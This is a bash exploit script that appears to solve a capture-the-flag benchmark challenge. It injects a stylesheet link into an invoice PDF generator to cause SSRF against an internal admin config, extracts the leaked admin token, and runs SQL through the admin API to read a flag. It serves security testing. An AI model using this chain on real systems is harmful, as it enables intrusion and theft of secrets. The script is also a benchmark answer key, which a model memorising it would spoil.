#!/usr/bin/env bash
# APEX-059-25 — "DocuLeaks Document Processing Chain" (tags: pdf_generation, ssrf)
#
# The invoice generator puts the customer's name into an HTML template and hands
# the result to a renderer. A renderer is a browser: a `<link rel="stylesheet">`
# in that name is a request the server makes on the attacker's behalf, from
# inside the network, and this one is generous enough to report what it fetched.
#
# What it fetches is the portal's own admin config, which is only "internal" in
# the sense that it is not routed externally — the renderer is internal. The
# config holds the admin token, and the admin API runs arbitrary SQL.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex059-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/documents/generate \
    --set header.Content-Type=application/json \
    --set json.template=invoice \
    --set 'json.data.name=<link rel="stylesheet" href="http://doc-portal:3059/api/admin/config">' \
    --set 'json.data.address=123 Main St' \
    --set 'json.data.company=Acme Corp' \
    --set json.data.total=100.00 | body | python3 -c '
import json, sys
for resource in json.load(sys.stdin)["document"]["fetched_resources"]:
    if "admin/config" in resource["url"]:
        print(json.loads(resource["content"])["config"]["admin_token"])
        break
')"

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/admin/query \
    --set header.Content-Type=application/json \
    --set "header.X-Admin-Token=$TOKEN" \
    --set "json.sql=SELECT key, value FROM system_secrets WHERE key = 'flag'" | flag
